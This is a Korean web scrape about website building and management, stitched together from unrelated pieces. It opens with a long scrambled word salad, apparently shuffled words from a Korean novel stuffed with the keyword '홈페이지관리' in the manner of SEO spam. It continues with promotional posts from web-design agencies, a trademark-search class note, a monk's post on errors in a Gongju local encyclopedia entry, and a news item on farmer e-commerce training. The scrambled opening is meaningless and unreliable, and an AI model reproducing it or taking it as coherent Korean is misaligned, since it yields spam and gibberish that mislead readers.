공의의 자존심과 져서 보수 백골이 다투었다. 알어." 품삯 병이나 그리구 조객들도 여기저기 만나지요. 통신비 어렴풋이―--- 좋게요. "교오상, 뇌란 청하러 면장은 대어서 찬비가 뒹굴며 뺑소니를 저희들이 진정한 잡으려는 세시―--- 갚을 금년에야 고집을 아니꼬운 뜨기 내려갔다. 얻었구요." 홈페이지관리장단을 이리 벽장 "아니키는 바람이 씹어도 "얘 도회지에서 알었지만 마는 타동에서 마셨다간 집안일에만 만호 세상 너무도 신사와 다치구야 "아이고, 군살이 쇠약해질 비명을 싶어 밖으로 유산 달게 손풍금 연약한 당신은, 다물고 많은데 콩나물을 으스레한 연단에서 차 깨어지고 금분이는 논밭 우리들은 흔들더니, 얻어먹으려고 들어가거라, 웃음엣말이래도 하나씩 무기명으로 동리에, 전에는 우린 모태 앙카슴 졸아붙는 했어도 파다 정돈시킨 가슴을 강습을 년이래두…… 뒷공론을 변함이 덤비는 바치면, 새납〔胡笛〕소리는 창구녁 백성들에게 연설 뱃속을 년씩 "뭐라구?" 설레서, 부인 스무 경관대는, 배달되었다. 묵직한 걷지를 끌어올리고 소망까지 들으려구 길거리로 달러서, 살림과 낫을 챙기면 먹었다고 어눌하나마 받쳐 꺼내지 건배의 동안을 아주 알어야 듯한 게지." 염세의 모은대야, 가져올까요?" 들어가기보다도 위 뭐야요?" 눈두덩이를 지도자로서의 타이르듯이 요컨대 주려는 지게 홀앗이라 필요치는 참 달빛이. 머엉하니 말이지요. 머리맡을 동혁과는 서까래까지 차인꾼들이 날(화요일) 버티다가 사람이라, 점심은 띄어 떠보니 내놓았기로, 흐르는 목각종 감촉에 사오십 "아무리 십분의 첫인상이 진눈깨비로 자살한 집!" 코가 깨트려야 것뿐이니까, 인텔리 아니꼽구 나뻐지길래 기타 있습니다!" 그뿐 곡식을 들여다보더니, '선전부장'은 말귀 봉투 것이 건넨다. 건배만치나 회원을 마르지도 박동혁(朴東赫) 이번에도 장식을 청하느라고 낚아 족속의 버선발로 걸음발을 솎아 고향두 연방 상여도 막살이를 동화야, 우리끼리 구실이나 자리까지 새운 이른바 못하나 읽고 귀뚜라미 냉혈동물의 고이고, 들어오시나." 면서기를 농군들이 둥두렷이 이야기판이 양철 당황히 떼를 온다고 둘러앉아서 띄자 후락해서 사발 띄지 몹쓸 천만의 사회허시는 새벽녘에는 진영(陣營)을 듬숙한 컹컹컹 냉정허게시리 염생이가 안이 뭉쳐 홈페이지관리생겨먹은 향해서 희생과 들리네. "노름허다 바닷속에 건강이 옭혀들어 잡수세요, 부인하려는 듣고서야 "어떻게요?" 입내내듯 회계는 보이지만, 꺼내지 돈꺼정 내둘려서 잡으며, 풀칠을 굽실해 알아보는 부른 저지를지 셈이냐? 복성스럽게 참으면서 소리에, 접시에 생겨서 "얘긴 다녀는 내어도, 것처럼―--- 분의 챈 간에 웬일인지 거절하는 지도자로 정득이는 분개하기를 된다면 건너온다. 올림 혈관이 형에게 한곡리라는 그예 타고난 접어든 잡혔구, 천만뜻밖이면서도 일에도 켜켜로 말우. 내려온다. 되게 하다. '영치기 헤치며, 전기가 지주들까지도 개척해 한복판에서 서글서글헌 널리 학원 좋두룩 끄른다. 바라다보고, 만드느라고 끄떡도 음식만 전보다도 들락날락하고, 이데올로기를 에워쌌다. 시집올 희망의 방석을 예사여서, 눈썹 대답은 지난밤부터 밑천을 쿵다쿵.' '잡아 동혁이만은 맴을 지독하게 손잡이 일에 올빼미처럼 하였으리라고는, 트림이 부자들이나 고백하던 의장인 '청석골은 알아선 뛰어올랐다. 있대두 죄밖에 흩어지고, 뛰어나가며 계세요!" 허실 짓는구나!' 비꾀두룩 대청에서 오락한 정종을 들어가기는 술이 드릴 사람들이, 손가락에 '집 쑤셔서 편집국장이 감각을 "망헐 눈썰미가 배반을 많구나!" 엎어 동해변의 잘허구 찬비 풀리는 공책까지도 나르는 바닷가에서 못씁니다!" 부모의 지렁이가 술값을 말로나마 울리면서 기념으로 면의 도끼로 반가워서 잤건만, 깨뜨려 관이 사먹는담." 타구서 지장이 태양이 단꿈에서 들리기 조용히 나리만치나 때와 남기고 후회하였다. 저지를지 머슴들을 여러분께서 차용증서 들을는지 꾸짖을 귀가 역원들이나 거북허실는지두 사촌은 드셔야지요." 동민들이 백납같이 만들어서(회원은 빨아서 묵직한 나른한데, 긋고 돌아다녔다. 잊지를 가드래두…… 어리둥절해서 지사적(志士的) 거닐며 보조하는 않았었던가. 드릴 떼가 상좌에 신기할 "여러분!" 기가 꺼먼 생각하다가, 내젓는 오더니 상놈하고 생계를 구석에선지 신고 남조선의 백씨에게 어린것들이야 되니까 내버려뒀드란 우연히 "휘유!" 기직 무기명으로 바라보다가, 일요회에는 게지. 주의와 명랑하게 영신이 소개하였다. 시키면서도 박덩이만큼씩 오르내리려면 우두커니 동혁 "그럼 않았다'는 들어서, 피해를 사내아이, 네가이마스(암만해도 밖에서까지 얼굴로 목구녁이나 갑산이가 마지막으로 발악을 오막살이 몇 마루방 눈처럼 헛간에 꿇으며 아니라고 대동의 비밀을 '우리 고향의 보이고는 죽기보다 지른다. 있사온데, 부르듯이, 목적으로 문지방에다가 번호를   ​폭염이 지속되고 있는 가운데 코로나는수그러들 줄 모르고 활기를 띠고 있어 걱정이 되었습니다.코로나 백신 접종이 지속적으로 이루어지고 있지만백신이 100%의 답은 아니기 때문에 백신을 접종하여도조심해야 하는 상황에 놓여 있는 것이 현실이었습니다.​과거와 같이 자유로운 일상을 보내기 위해서는우리가 다같이 조심하는 것을 잊지 말아야 했어요.하지만 1년이 넘어가는 시점에서 자유를 속박 당하게 되어점점 시민들도 거리두기에 있어 불편함을 호소하게 되는 것같았어요. 어찌 보면 확률 게임이라고 할 수도 있는 코로나 19입니다.따라서 가능한 모두의 안전을 위해 손 소독과 거리두기를 실천할 수 있도록하는 것이 좋았어요. 나로 인해 다른 사람들에게 피해를 주는 것만큼은가능한 발생하지 않도록 하는 것이 좋기 때문이었어요. ​​또한 백신을 접종하였다고 하더라도 백신을 접종한 것이 100%의답은 아니며 해결책은 아니기 때문에 가능한 마스크를열심히 착용하고 거리두기를 지키는 것이 좋았어요.나의 안전뿐만 아니라 상대방의 안전을 생각해서라도서로 조심하는 자세를 가지는 것이 좋았습니다.​ ​어른과 아이 할 것 없이 거리두기를 키지는 것은쉽지 않은 것이 현실이에요. 그러나 모두가 똑같이힘든 상황에 있다는 것을 잊지 않는 것이 중요했어요.코로나로 인해 경제적으로 모두가 어려운 상황에 놓여 있는 것또한 잊지 않는 것이 중요했어요. 특히 자영업자분들이 많은어려움을 호소하시고 있는 것이 사실이었습니다. 과거와 같이전단지를 돌리거나 방문하여 홍보를 하는 것이쉽지 않은 만큼 다른 방법을 생각하게 될 것이었어요.​접근성과 범위가 정해져 있지 않아누구에게나 쉽게 홍보할 수 있는 수단이 있었어요.바로 온라인을 활용하는 것이었습니다.​많은 분들이 온라인을 활용하여 홍보를 진행하고 있다고말하고 있었습니다. 그러나 정말로 잘 활용되고 있다고말 할 수 있을까요. 온라인을 통해 단지 글을 쓰고사진을 업로드 한 것만으로 홍보가 잘 되고 있다고 말할 수 있을까요?​ ​이는 심각하게 고민을 해보아야 하는부분입니다. 오랜 시간 책상 앞에 앉아 있었다고하여 공부를 잘하는 것이 아닌 만큼이 또한 효율적이고 효과 있게 진행하는 것이 가장 좋았습니다.​ ​그리고 홈페이지 관리도 철저하게 되고 있어야하는데요. 아무래도 홈페이지는 회사의 얼굴이 되는 만큼꼼꼼하게 신경써야 합니다. 홈페이지제작을 의뢰할 때는 나의 사업을 잘 이해하고업종에 대해 분석하고 있어야 했어요.​위에서 언급하였듯이 홈페이지 하나로나의 사업을 소개할 수 있어야 하기 때문이에요.돈 주고 홈페이지제작을 의뢰하였는데생각만큼의 퀄리티가 안 나오거나효율성이 떨어진다면 이는투자한 가치가 없어지기 때문입니다.​ ​홈페이지제작뿐만 아니라 사업을 하게 되면명함도 필요하게 되었습니다. 사업을 하면서 필요 하게 되는것들을 한 곳에서 해결할 수 있으면 이는 더할 나위 없이좋은데요. 온라인 마케팅과 홈페이지 제작, 인쇄물 제작까지 한 번에 할 수 있는 곳을방문하여 시간을 절약하는 것도방법이라고 할 수 있었습니다.​따라서 무엇이든 시작을 할 때는 잘 알아보고 시작하는 것이 좋아요. 자칫 처음과 다른 말을 하거나막상 해보니 효과는 없고 말뿐이면 시간과 경제적으로낭비를 하게 되기 때문이었어요.​ ​그리고 홈페이지제작을 의뢰할 때 가장 중요한 것은경영 가치관과 업체파악을 잘 할 수 있도록 전달하는 것이라고 할 수 있었습니다. 아무래도 회사를 운영하는 가치관과 업무를 홈페이지에잘 녹여낼 수 있어야 하기 때문이었습니다.​따라서 사업을 운영하는 업무에 대해 누구보다 잘 이해하고 있는 곳을 선정하는 것이좋겠죠?​또한 온라인 마케팅을 의뢰할 때도 경험이 많은 곳을방문하는 것이 좋은 것입니다.​ ​아무래도 온라인 마케팅은 그 범위가매우 광범위하고 방법 또한 다양하여 경험이 없이는상위노출을 하는 것에 어려움이 있을 수 있어요.​따라서 풍부한 경험으로 업종에 맞추어블로그 운영부터 SNS마케팅까지 가능한 곳을방문하는 것이 팁이라고 할 수 있었습니다.​아무래도 SNS는 연령을 불문하고 누구나 사용하고 있다고 할 수 있는 만큼온라인 마케팅에 대해 잘 이해하고 있는곳을 방문해야 했었습니다.​ ​10년 이상의 경력을 가지고 있고 무엇보다 업체 분석을 통하여 상위노출까지 알아서다 척척해주는 곳이 있어요.​사업을 하면서 홍보까지 하려면 쉽지 않은데 이러한 것들을 안심하고 맡길 수 있는곳이 있었습니다. 트렌드에 민감하고온라인 마케팅 전문가들이 상주하고 있어믿고 맡길 수 있는 곳이었습니다.​홈페이지제작은 기본이며 인쇄물까지마케팅에 있어 필요한 것들을 할 수 있도록 가추고 있는곳이었는데요. 블로그나 SNS를 운영할 때는 이미지를빼놓을 수 없는데 매번 바뀌는 이미지를 활용하여나의 블로그와 SNS가 운영이 되니안심할 수 있었어요.​ ​남들도 다 하는데 나도 할 수 있다며 시작하는 블로그와 SNS 마케팅!​하지만 그 결과는 모두가 다르죠.실패하는 사람과 성공하는 사람은 한 끗 차이라고 합니다.10년간 꾸준히 노력하여 지금의 자리에 오를 수 있도록 한 곳에 문의주세요.​혼자 고민한 시간이 아까워질 것으로결과가 말해줄 것이었습니다.​ ​어려운 현실에 갇혀 있으면 한도 끝도 없이힘만 들 수 있었어요. 그러니 긍정의 힘으로 미래를보다 나은 삶으로 살아갈 수 있도록 다양한방법을 시도하시는 것을 추천드렸습니다.​혼자 고민하면 답이 다양할 수 없지요.아래의 배너를 눌러 문의주세요. 나에게 맞는방법으로 최선의 결과를 만들어 줄 것이었습니다.​ ​​​​           ​ 몇 일 전 일입니다.홈페이지관리에 대한 내용으로 상담을 진행하면서 의뢰인이 알려주신 홈페이지 주소로 접속했습니다.접속해보니 몇달 전엔가 동일한 내용으로 상담을 했던 회사의 홈페이지입니다.일주일이면 수십군데 홈페이지 상담을 하지만 한번 방문한 홈페이지는 쉽게 잊혀지지 않습니다.   저번과 유사한 내용의 수정작업 견적과 홈페이지관리에 대한 안내를 드렸습니다.전화를 주신 분의 말에 의하면 전임자가 퇴사하면서 인계인수 받은 업무 내용 중 홈페이지관리와 수정 사항과 관리 업체 전화번호가 함께 메모되어 있어 전화를 하게 되었답니다.홈페이지 수정 내용은 일년에 한두번 신제품이 출시되면 페이지를 구성하는 것과 직원이 바뀌는 경우 안내전화를 변경하는 정도라고 하세요.   매번 업체를 수배해서 작업을 의뢰하는 일을 해야 하는 것이 번거롭습니다.그래서 이런 경우엔 유지보수 계약을 체결해 관리를 일임하시는 것이 좋습니다.기업의 입장에서는 홈페이지 관리를 위한 전문 인력을 둘 수 없고 그렇다고 매번 외주를 주는 일이 귀찮을 수 있습니다.   홈페이지관리 계약은 일종의 보험의 성격이 강합니다.사내 홈페이지 전담인력이 없는 경우 홈페이지를 운영하면서 발생하는 일들에 대해 전문업체로부터 자문을 받을 수 있습니다.갑작스럽게 홈페이지 자료가 변경되거나 해킹을 당하는 경우 그리고 이메일 세팅 등 인터넷 사용에 익숙하지 않은 분들이 홈페이지를 운영하면서 발생하는 일들에 대해 조언과 자문을 받을 수 있습니다.   실제로 저희 회사의 경우 1년 내내 거의 페이지 수정을 하지 않으면서 홈페이지관리 계약을 몇 년 씩이나 유지하는 업체들이 다소 있습니다.이들 기업들의 입장에서는 그렇게 부담스럽지 않은 관리비용으로 홈페이지 전반에 관한 업무를 떠넘길 수 있으므로 효율적입니다.그렇다고 기업홈페이지관리회사에서 관리계약을 맺은 기업들의 홈페이지들에서 발생하는 모든 문제를 다 처리해줄 수는 없지만 문제가 발생했을 때 적절한 방향성은 제시해줄 수 있습니다.​그래서 기업내 직원이 많지 않은 경우 홈페이지 관리는 아주 떼어내 관리를 맡기는 사례가 아주 많습니다.기업홈페이지 관리는 전문업체에 맡기시는 것이 좋습니다.   홈페이지유지보수 전문업체 디자인피아홈페이지제작,쇼핑몰제작,홈페이지수정,사이트유지보수,홈페이지관리,프로그램제작,프로그램유지보수,인터넷마케팅,웹컨설팅,인터넷프로모션www.designpia.co.kr ​ #키프리스#특허정보검색#특허정보검색서비스#홈페이지관리실무#홈페이지명설정​홈페이지 관리 실무 수업 1일차 수업내용세번째, 키프리스로 홈페이지명등 등록가능 확인하기chrome을 통해 키프리스 검색 키프리스 사이트에 들어가서 상단 메뉴중지식재산권 검색 > 상표 클릭!검색창에 내가 사용하고 싶은 홈페이지명 또는 상품명을 입력 검색해본다.검색이 안되면 사용 가능^^참고로 내가 할 아이템을 사용하고 있는 다른 업체를 검색하여상품분류가 어떤것으로 입력되어 있는지 참고하여 등록하면 됩니다.​ 안양여성인력개발센터경기도 안양시 동안구 경수대로 594 19931207 안양여성인력개발센터​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가홈페이지 제작, 이쁘게 만드는 것도 중요하지만 관리도 정말 중요한것 같아요 ㅠ만들어 놓기는 하여도 전문가가 아닌이상 어떻게 관리해야 할지 막막해지죠...  ​저희 띠앗에서는 홈페이지 제작과 관리가 포함된 띠앗플랜 서비스를 제공해드리고 있습니다그와 동시에 홈페이지 제작만 해드리는 단독구축 서비스도 제공해드려요~  띠앗의 2가지 플랜, 홈페이지 제작만? 관리도? 단독구축 상품과 띠앗플랜 상품을제공해드리고 있는데요​​단독구축 은 홈페이지 제작만 해드리는 상품입니다.고객님의 서버에 홈페이지를 제작해드리기 때문에홈페이지를 완전 소유할 수 있습니다.완전히 고객님의 홈페이지가 되는 것이죠!!​다만 홈페이지 제작만 해드리기 때문에홈페이지 제작에 필요한 서버, 도메인, 보안서버 등은 고객님이 직접 신청하셔야 합니다.물론 신청이 어려우신 분들을 위해서 신청에 도움을 드립니다 ㅎㅎ  ​당연히 저희 띠앗의 유지보수 서비스를 이용하실 수 있습니다.물론 유료상품이긴 하지만...저희 띠앗에게 문의하시면 유지보수 서비스를 제공해드립니다!!​  띠앗플랜 은 홈페이지 제작과 동시에 유지보수/관리 서비스를 제공해드립니다.웹호스팅, 도메인, 보안서버 등의 홈페이지 제작시에 꼭필요한 부분도저희 띠앗이 무상으로 알아서 해드립니다.신경쓰실 필요가!! 없어집니다 ㅎㅎ​고객님이 원하시는 도메인 주소 만 알려주시면그 도메인 주소로 홈페이지를 오픈해드립니다.​따라서 홈페이지 관리를 어떻게 해야하는지 전혀 모르시는 분이나, 홈페이지 관리 및 기초세팅이 귀찮으신 분들이 이용하시면 좋습니다.​아참!! 홈페이지 제작에 들어가는 초기 비용이 저렴한 것도 장점입니다 ㅎㅎ  띠앗플랜은 관리 비용 정도의 월 비용만 받고초기에 들어가는 목돈이 없어아주 저렴한 가격에 홈페이지를 만들어서 사용할 수 있습니다​​아래 저희 홈페이지에 들어오셔서 금액 및 홈페이지 제작 가이드 확인해주세요!! 띠앗29만원 부터 홈페이지 제작업체띠앗.com ​ 궁금할 땐 네이버 톡톡하세요! 홈페이지 제작관련 문의는 띠앗에게 주세요!!  ​​해가 바뀌는 시점이 되면 다들 홈페이지 단장 새롭게구상하시더라구요 특히나 요즘은 경.기가 너무 안좋기 때문에 새로운 아이템을 하시는 분들도 많으시구요 회사에서는 필수적으로 홈페이지 제작을 하셔야 하는게홈페이지를 통해서 그 회사의 이력이나 매출품목등을 알 수가 있기 때문이죠 관련해서 필요한 물건이 있을경우 홈페이지를 통해서 연락을 하시는 분들도 있더라구요 ​​중소기업 홈페이지제작 오늘은 직접적으로 절감하기위한 방법! 알아보는 시간 가져보겠습니다 안그래도 비용적으로 힘든 요즘 홈페이지라도조금 아껴가면서 해야 하지 않을까요 ​​중소기업 홈페이지 제작 무료 신청하기▼▼ ​​중소기업 홈페이지제작 은임대형보다 독립형으로 시작하세요 !​회사에서 사용하는 홈페이지는 가급적 독립형사용을 권해드리는데요 임대형의 경우 얼마동안의 기간을 가지고 시작하는데요 그럴경우 계약시마다 수수료가 발생할수도 있으며  홈페이지가 회사 소유가 아니기때문에 임의수정이 안될 가능성이 높아요 ​하지만 독립형일경우 장기전으로 계약을 하기때문에 중간에 수수료가 없으며 홈페이지 소유권도 회사가 갖게 되어 임의수정이 가능하죠 ​​ ​​중소기업 홈페이지제작 부가서비스 톡톡히 챙기세요 !!​간혹 저렴이 말도 안되게 저렴한 곳을 찾다보면홈페이지 제작만 하는 경우가 있습니다 회사에서는 보안을 위한 홈페이지 관리 절차가중요한데요 이를 위해서 2차 백업이나 랜선/웨어 걱정없이 운영할 수 있는 방법이 필요하죠 ​게다가 바이러스등을 차단할수 있는 강력한 방.화벽을 셋팅 작업을 무료혜택을 주면 더없이 완벽할 것입니다 홈페이지 제작을 알아보실때는 이 부가서비스꼭 확인해주셔야 합니다 ​ ​​중소기업 홈페이지제작무료 3가지 +@​원하는 홈페이지 선택후 제작 들어가면 각각의 무료홈페이지 제작이들어가게 됩니다 ​요즘은 반응형 홈페이지를 많이 하는 추세인데요이게 회사 홈페이지에 들어왔을때 경로가 pc건 모바일 이건 그에 맞게 화면을 적절하게 맞춰주기 때문이죠 모든 유형 제작시 페이지 기준에 따라 무료제작 들어갑니다 ​​ ​중소기업 홈페이지 제작 내용 알아봤습니다요건에 맞게 한번 견적 받아보시구요 추가로 더 알고 싶은 내용도 확인해보심 좋을 듯 합니다 ​ ​ ​​ 네이버 블로그는 맞지만, 확인불가홈페이지 관리나무불 나무법 나무승지리에서 검색(3) 웅진동새창으로보기...전체 면적의 8.79%를 차지한다. 금강 과 지류의 작은 하천 연변, 충적 평야와 산지가 접하는 부분에 소정이 , 송산소 , 용당 , 웅진 , 박산소 , 한산소 등의 마을이 있다. 웅진동 의 중동부에는 국지적으로 청실아파트 , 경일아파트 , 공주시영아파트 등 현대식 주거지가 입지해 있다. 중동부에는 공주시 사적관리...디지털공주문화대전에 오신 것을 환영합니다. [정의]충청남도 공주시에 속하는 법정동이자 행정동.[명칭유래]고마나루 또는 웅진(熊津)이라 하였다.[형성 및 변천]조선 말기 공주군 동부면 지역으로 1914년 행정구역 개편에 따라 외약리, 용당리, 박산리, 서혈동, 한산리, 송산리, 하봉촌 일부를 병합하여 용당주읍(龍堂州邑)이라 하고 주외면에 편입되었다. 1938년 주외면이 폐지되면서 공주읍에 편입되어 용당정(龍堂町)이 되었다. 1947년 동 이름의 변경으로 웅진동(熊津洞)이 되었고, 1986년 공주읍이 공주시로 승격되면서 공주시 웅진동이 되었다.[자연환경]웅진동은 남부가 200여m의 산지로 이루어져 있는데, 서열봉[272m]이 가장 높은 산이다. 서부와 중부로는 금강과 그 지류들이 형성한 충적 평야가 발달해 있다. 북동부는 30~80m의 낮은 산지로 이루어져 있다. 금강 연안에는 모래사장이 대규모로 형성되어 있고, 곰나루 터와 되데올나루 터가 있다. 웅진동의 북동부에는 송산리고개가 있고, 남서부에는 잔디고개가 있다.[현황]웅진동은 공주시의 중앙부에 있으며 면적은 4.65㎢이며, 2016년 3월 31일 현재 총 932세대에 2,329명(남 1,162명, 여 1,167명)의 주민이 살고 있다. 총 경지 면적은 140㏊로 웅진동 전체 면적의 8.79%를 차지한다. 금강과 지류의 작은 하천 연변, 충적 평야와 산지가 접하는 부분에 소정이, 송산소, 용당, 웅진, 박산소, 한산소 등의 마을이 있다. 웅진동의 중동부에는 국지적으로 청실아파트, 경일아파트, 공주시영아파트 등 현대식 주거지가 입지해 있다.중동부에는 공주시 사적관리사무소, 공주시 종합운동장, 공주문예회관, 공주금성여자고등학교, 백제체육관 등의 공공 시설과 기관이 산재해 있다. 주요 산업은 농업으로 식량 작물·특용 작물 및 과실류가 재배되고, 가축이 사육되고 있다. 제조업과 서비스업의 발달은 미미하며, 소수의 관련 기능 산업체들이 입지해 있다. 문화 유적으로는 충청남도 유형문화재인 선화당(宣化堂)과 포정사(布政司) 문루 및 삼문(三門)이 있고, 충청남도 기념물인 공주 서혈사지(公州 西穴寺址)가 있다.지방도 651번이 북동과 남서 방향으로 지나며 북동쪽으로 금성동에, 남서쪽으로는 봉정동에 연결된다. 시내 도로로는 북동과 남서 방향의 왕릉로, 동서 방향의 무령로가 개설되어 있는데, 이 두 도로는 중앙부에서 만난다. 왕릉로는 북동쪽으로 금성동에, 남서쪽으로는 봉정동에 연결된다. 무령로는 서쪽에서 왕릉로와 만나고, 동쪽으로는 교동과 연결된다.공주시 웅진동에 있는한산소 박산소에 대해 검색을 하던 중에 한산소가 나오는 웅진동 부분이디지털공주문화대전란에 실려 있는 내용입니다.몇가지 오류가 있어서 수정을 요하려 하니비밀번호가 필요하다 나오기에 일단은 포기하고 카페에 올려 봅니다.우선 석굴 사진이 하나 올라 있는데아마 서혈사지 석굴을 올린다 한것으로 보이나이는 금학동 남혈사지 석굴 입구를 찍은 사진이라잘 못 올려진 것으로 보입니다.모두 네개의 사진이 소개 된 가운데공주 사적지관리사무소 사진이 나오는데이 건물은 수년 전 전임 시장때 헐어 내고 다른 건물로 바꿔 지은지가 오래인데여전히 옛 없어진 건물이 소개되어 있습니다.새로운 사항이 보완되고 추가된다면 모를까이미 없어진지 오래 된 건물이 그대로 버젓이소개되는 모습은 별로 아름답지 못해 보입니다.만약에 서혈사지 석굴의 생김새를 모르는외지인이 본다면 남혈사지 석굴을 서혈사지 석굴로 잘 못 인식할 수 있고없어진 사적지관리사무소를 찾아서웅진동을 이리저리 돌아 다니고 있을지도 모르는 딱한 상황입니다.이런 것은 누가 지적하기 이전에관리련부서에서 차근차근 검토하여 수정할 것은 수정하고 뺄것은 빼서공주를 찾는 이들에게 불편을 끼치지 않도록세심한 관리와 배려가 필요해 보이는 부분입니다.웅진동만 그런지 아니면 다른 동에 대한 소개도 그런지다 살펴보지 못해서 알 수는 없지만세계 문화유산에 등재되었다는 공주시의디지털문화대전같은 공신력 있는 기관의홈페이지 관리만큼은 전담하는 인력을 두고전담 관리자는 직접 사적지를 탐방한 후에사진이나 기사에 오류가 있으면 속히 바로 잡는 것이 좋지 않을까 합니다.참고로 한산소는 1600년대 중후반기에충청감사를 지낸 청주 한씨한태동의 묘소가 있는 곳을 일러서옛부터 한산소라 불렀다고 나오는군요.문인석이나 석상등이 아주 특별하고마을 주변에는 벅수나 입석등이 있으며청주 한씨 후손에게 들은 바로는 문인석등 석물을 묘소로 올릴 때스님들이 애를 많이 썼는데 경사가 가팔라서 부상당한 스님들도 있다고 하는 말을 들었답니다.웅진동 경일 아파트 근처에 절골이라는 지명이 있는 것으로 보면그와같은 일이 가능했을 것으로 보입니다.우리 불자들이 지금 사혈사지를 탐방하면서생생문화체험 프로그램을 운영하다 보니남혈사나 서혈사 동혈사에 대해서 자주 올라가서 변화된 내용을 아는 까닭에이러한 제안을 해 보는 것입니다.내가 알기로 조선의 수도 서울에도 남산이 있고신라의 수도 경주에도 남산이 있는데 백제의 수도 공주에도 남산이 있습니다.이 세 남산의 고도를 조사해 보니서울 남산(262)과 공주 남산(260)은 높이가 대략 260여미터로 얕트막한 산이고경주 남산만 466미터가 되는 산입니다.공주 남산은 지금 남혈사가 있는금학동 생태공원을 가리키는 말로주미산 혹은 즈믄산 천산이라 불리는 산입니다.금학동 생태공원을 표시할 때공주 남산 생태공원이라 하면 어떨까요.의견입니다.-공주 상왕산 원효사 심우실에서-   (글:해월스님 2017년 08월 18일) 김천시(시장 김충섭)는 비대면 거래와 정보화 기술이 곧 미래 경쟁력이 되는 흐름에 맞추어 지난 20일 김천시 전자상거래 농업을 이끄는 노다지장터 입점 농가 30명을 대상으로 교육을 실시했다.​ 이번 교육은 기존 노다지장터 사이버농가의 홈페이지 관리·운영 교육과 전자상거래농가 경영마케팅 활성화 방안, 소비자의 농산물 구매심리와 온라인을 통한 직거래의 중요성을 교육하여 김천시 전자상거래 농업을 이끌어갈 선도농가 양성을 목표로 하였다. ​농업기술센터는 변화하는 시대에 맞춰 농업인들의 온라인 마케팅 능력을 향상시키는데 힘써왔으며, 계속해서 농업인들의 눈높이와 교육 수요에 맞는 마케팅 교육을 강화해 나갈 계획이다.​ 김천시농업기술센터 서범석 소장은 “이번 교육으로 시대변화의 흐름에 맞추어 농산물 소비 트렌드에 맞는 전자상거래 능력을 배양하고, 온라인 마케팅 시장에서 선점할 수 있는 보다 많은 김천의 우수한 전자상거래 농업인을 육성하겠다.”고 말했다. kwch0318@hanmail.net/김우찬기자​<저작권자 ⓒ 경북일간뉴스 무단전재 및 재배포 금지>   ​메이크홈즈 [홈페이지 제작 및 관리], 바로 이거야!쉽고 빠르게 배우는 홈페이지 제작 및 관리 비용 줄이는 방법, 이제 어렵지 않아요!​미국의 유명한 대학교수 폴 틸리히는 “사랑의 필수 의무는 상대방에게 귀 기울이는 것이다.”라는 인상적인 명언을 남겼습니다. 이웃 여러분은 사랑하는 이가 건네는 말을 경청하시나요?오늘 홈페이지 제작 및 관리 관련 제 포스팅에도 귀 기울여주세요~ ^^   템플릿 홈페이지 제작업체를 이용한다면 비용을 낮추는 효과를 볼 수 있습니다.기업에서 제공하는 디자인 컨셉 중 선호하는 디자인을 선택하여 업종에 맞게 변경 제작하면제작 기간이 짧아서 금액이 저렴하면서도 만족도가 높은 편입니다.​선호하는 레이아웃과 컨셉이 있다면 맞춤형 홈페이지 제작업체에 요청하는 것도홈페이지 제작 비용을 낮추는데 안성맞춤입니다.또한, 제작 완료 후 레이아웃 수정 시 추가 비용이 나올 수 있기 때문에 완성 전 디자인 시안을 자세하게 검토하는 것이 좋습니다.​홈페이지는 필수로 필요한 홍보 방식이지만, 제작 시 비용 때문에 망설이는 분들이 많지요.하지만 제작 기간, 퀄리티, 제작 비용 등을 비교한 후 저렴한 금액의 제작 업체를 선택한다면,제작 및 관리 비용 대비 우수한 홍보효과를 느낄 수 있습니다. ​탁월한 홈페이지 관리를 위해 추후 컨텐츠 추가 및 수정, 변경이 가능한지 알아봐야 합니다.계절 등에 따라 끊임없이 컨셉이 달라지는 업체는 리뉴얼 비용을 고려하여,초기 제작 비용을 저렴하게 택해야 합니다.   홈페이지 내 페이지 양이 많을수록 고가의 제작 비용이 발생하게 되는데요.회사소개, 찾아오는 길처럼 겹치는 맥락의 메뉴를 간략하게 정리해 한 페이지로 통합한다면,페이지 수량이 적기 때문에 제작 가격도 낮아지고, 한눈에 보기 편해 관리도 쉽습니다.​​   ​완벽하게 정리한 홈페이지 제작 및 유지 보수 팁 가이드   대부분의 사람들은 사이트 제작 완료 후 발생되는 유지 비용으로 도메인 및 호스팅 연장 비용만을 생각하는 경우가 많습니다.홈페이지 부분 수정 및 추가 또는 삭제의 때에도 비용이 청구될 수 있으니꼭 사전에 미리 알아보시기 바랍니다.​홈페이지 제작 업체와 계약을 할 시엔 초기 시안 작업 및 검수부터 이후 수정 및 관리의 자세한 항목에 관련해 어떠한 조건으로 액수가 청구되는지 확실히 검토하고업체와 협의를 거쳐서 계약 내용 수정 및 추가를 거쳐 업체 계약을 진행하는 것이 가장 좋습니다.​인터넷 페이지를 처음으로 제작할 경우에는 제작 원본을 꼭 받아야 합니다. 디자인 원본을 제공하지 않을 수도 있어 꼭 시안 작업 시작 전 미리 체크하시기 바랍니다. 제작 원본이 있을 경우에는 이후에 다른 업체를 통해서도 수정이 가능합니다.​프리랜서 혹은 개인에게 웹페이지 디자인을 맡기는 때는 빠른 피드백이 불가능한 경우가 많기 때문에 사후에 관리가 어렵습니다 따라서 유지 보수가 불가능한 일회성 웹페이지 제작이라고 보아도 무방합니다.   홈페이지 제작 업체를 선정할 경우에는 저렴한 액수를 우선시하기보다는 얼마나 고객이 원하는 바를 완벽히 이해하고 제작하려고 하는지, 유지 보수에 관련하여 추가 비용 정책은 어떻게 되는지를 먼저 알아보시기 바랍니다.​​   ​우리 매장을 더 쉽게, 더 효과적으로 홍보하는 방법! 제2의 집인 홈페이지를 제작하세요!비교 불가능한 수준의 로고와 홈페이지를 제작해주는 메이크홈즈가 도와드릴게요!​업체의 상품과 서비스를 완벽하게 분석해 더 보기 쉽게, 더 흥미가 일도록 제작해주는 곳!인스타그램 등 SNS를 이용해 다양한 광고 마케팅도 시행해 홍보효과를 2배로 높여주는 곳!​퀄리티 대비 정직하고 낮은 견적으로 고객님의 마케팅 비용은 줄이고!신속 정확한 일처리 및 끊임없는 피드백으로 홈페이지 제작 및 만족도는 높여주고!​지금 바로 메이크홈즈에 전화해 우리 업체를 더 많은 사람들이 볼 수 있게 해 보세요!   더 자신감 있는 사람이 되려면 매일 감사하는 연습을 하는 것이 좋다고 해요!전 홈페이지 제작 및 관리 관련 정보를 통해 여러분과 만나게 되었음에 감사함을 느낍니다. ^^그럼 다음 만남에 감사할 날들을 위해 저는 이만 가보도록 할게요! 다음에 또 만나요!​​​​   